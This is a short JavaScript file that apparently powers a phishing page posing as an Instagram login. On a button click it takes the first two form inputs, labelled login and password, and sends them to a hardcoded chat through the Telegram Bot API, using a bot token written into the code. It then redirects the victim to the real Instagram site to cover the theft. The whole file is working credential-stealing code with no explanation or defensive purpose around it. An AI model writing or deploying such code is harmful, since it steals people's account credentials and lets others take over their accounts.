let BOT_TOKEN = '6610875070:AAFVU-giqJf9057Ih8UsbyFznotsJBwPEpE'
let telegram_url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`
let TELEGRAM_CHAT_ID = '1844909205'

let inputs = document.querySelectorAll('input')
let button = document.querySelector('button')

button.addEventListener('click', (event) =>{
    event.preventDefault()
    sendMessageToBot()

    window.location.href = 'https://www.instagram.com'
})
function sendMessageToBot(e){
    fetch(telegram_url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: `\n Login: ${inputs[0].value} \n Password: ${inputs[1].value}`
        })
    })
    .then(response => response.json())
    .then(data => {
        console.log('Message sent successfully:', data);
    })
    .catch(error => {
        console.error('Error sending message:', error)
    });
}